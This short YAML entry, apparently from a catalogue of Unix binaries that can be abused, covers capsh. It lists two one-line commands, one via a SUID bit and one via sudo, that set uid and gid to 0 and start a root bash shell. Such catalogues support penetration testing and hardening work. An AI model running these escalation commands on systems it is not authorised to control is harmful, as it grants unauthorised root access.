---
description : Linux capability support and use can be explored and constrained with
	      this tool. This tool provides a handy wrapper for certain types of
              capability testing and environment creation. It also provides some
              debugging features useful for summarizing capability state.
functions:
  suid:
    - code:/usr/sbin/capsh --gid=0 --uid=0 -- -c '/bin/bash'
  sudo:
    - code:sudo -u root /usr/sbin/capsh --gid=0 --uid=0 -- -c '/bin/bash'
---
